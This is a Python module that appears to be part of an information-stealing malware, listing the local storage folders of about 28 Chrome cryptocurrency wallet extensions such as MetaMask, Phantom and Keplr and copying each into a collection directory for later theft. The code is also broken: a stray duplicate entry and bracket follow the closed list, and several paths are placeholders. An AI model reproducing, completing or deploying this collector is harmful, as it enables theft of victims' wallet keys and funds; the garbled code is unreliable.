import os

ChromeWalletsDirectories = [
    ["Chrome_Binance", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"],
    ["Chrome_Bitapp", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"],
    ["Chrome_Coin98", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"],
    ["Chrome_Equal", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"],
    ["Chrome_Guild", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"],
    ["Chrome_Iconex", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"],
    ["Chrome_Math", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"],
    ["Chrome_Mobox", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"],
    ["Chrome_Phantom", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"],
    ["Chrome_Tron", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"],
    ["Chrome_XinPay", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"],
    ["Chrome_Ton", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"],
    ["Chrome_Metamask", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"],
    ["Chrome_Sollet", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"],
    ["Chrome_Slope", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"],
    ["Chrome_Starcoin", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"],
    ["Chrome_Swash", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"],
    ["Chrome_Finnie", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"],
    ["Chrome_Keplr", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"],
    ["Chrome_Crocobit", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"],
    ["Chrome_Oxygen", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"],
    ["Chrome_Nifty", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"],
    ["Chrome_Liquality", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"],
    ["Chrome_TrustWallet", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newtrustwalletpath"],
    ["Chrome_Exodus", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newexoduspath"],
    ["Chrome_Coinbase", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newcoinbasepath"],
    ["Chrome_Trezor", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newtrezorpath"],
    ["Chrome_Ledger", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newledgerpath"]
]
    ["Chrome_Liquality", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"]
]

def get_chrome_wallets(save_dir):
    try:
        os.makedirs(save_dir, exist_ok=True)
        for wallet in ChromeWalletsDirectories:
            copy_wallet_from_directory_to(save_dir, wallet[1], wallet[0])
        if Counter.BrowserWallets == 0:
            Filemanager.recursive_delete(save_dir)
    except Exception as ex:
        Logging.log("Chrome Browser Wallets >> Failed to collect wallets from Chrome browser\n" + str(ex))

def copy_wallet_from_directory_to(save_dir, wallet_dir, wallet_name):
    dir_path = os.path.join(save_dir, wallet_name)
    if not os.path.exists(wallet_dir):
        Logging.log(f"Wallet directory does not exist: {wallet_dir}")
        return
    try:
        Filemanager.copy_directory(wallet_dir, dir_path)
        Counter.BrowserWallets += 1
    except Exception as ex:
        Logging.log(f"Failed to copy wallet {wallet_name} from {wallet_dir} to {dir_path}\nError: {str(ex)}")